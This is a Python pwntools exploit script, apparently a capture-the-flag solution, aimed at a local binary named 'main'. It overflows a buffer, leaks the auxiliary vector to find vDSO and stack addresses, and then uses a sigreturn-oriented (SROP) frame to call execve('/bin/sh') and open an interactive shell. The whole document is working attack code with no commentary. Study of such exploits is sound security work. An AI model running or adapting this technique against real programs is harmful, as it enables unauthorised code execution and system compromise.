#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
#context.terminal = ['lxterminal', '-e']

p = process('./main')

# id's of Auxillary Vectors
AT_SYSINFO_EHDR = 0x21
AT_HWCAP = 0x10
AT_PAGESZ = 0x06
AT_CLKTCK = 0x11
AT_PHDR = 0x03
AT_PHENT = 0x04
AT_PHNUM = 0x05
AT_BASE = 0x07
AT_FLAGS = 0x08
AT_ENTRY = 0x09
AT_UID = 0x0b
AT_EUID = 0x0c
AT_GID = 0x0d
AT_EGID = 0x0e
AT_SECURE = 0x17
AT_RANDOM = 0x19
AT_EXECFN = 0x1f
AT_PLATFORM = 0x0f

gdb.attach(p)

vuln_addr = 0x400082
set_write = 0x4000ac
syscall_addr = 0x400096
set_sigreturn = 0x4000b2

payload = '/bin/sh\x00'
payload += p64(vuln_addr)
payload += p64(set_write)
payload += p64(syscall_addr)
payload += 'A' * 8
payload += p64(vuln_addr)
raw_input('@')
p.send(payload)

payload = 'A'
raw_input('@')
p.send(payload)
ENV_AUX_VEC = p.recv(1024)
QWORD_LIST = []
for i in range(0, len(ENV_AUX_VEC), 8):
    QWORD_LIST.append(u64(ENV_AUX_VEC[i:i + 8]))
start_aux_vec = QWORD_LIST.index(AT_SYSINFO_EHDR)
info(hex(start_aux_vec))
AUX_VEC_ENTRIES = QWORD_LIST[start_aux_vec: start_aux_vec + (18 * 2)] # size of auxillary table
AUX_VEC_ENTRIES = dict(AUX_VEC_ENTRIES[i:i + 2] for i in range(0, len(AUX_VEC_ENTRIES), 2))
vdso_addr = AUX_VEC_ENTRIES[AT_SYSINFO_EHDR]
info("vdso_addr = " + hex(vdso_addr))
bin_sh_addr = AUX_VEC_ENTRIES[AT_RANDOM] - 0x379
info("bin_sh_addr = " + hex(bin_sh_addr))

syscall_ret = 0xffffffffff600007
syscall_ret = 0x4000b8

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh_addr
frame.rip = syscall_addr
payload = 'A' * 8 + p64(set_sigreturn) + p64(syscall_ret) + str(frame)
raw_input('@')
p.send(payload)

p.interactive()
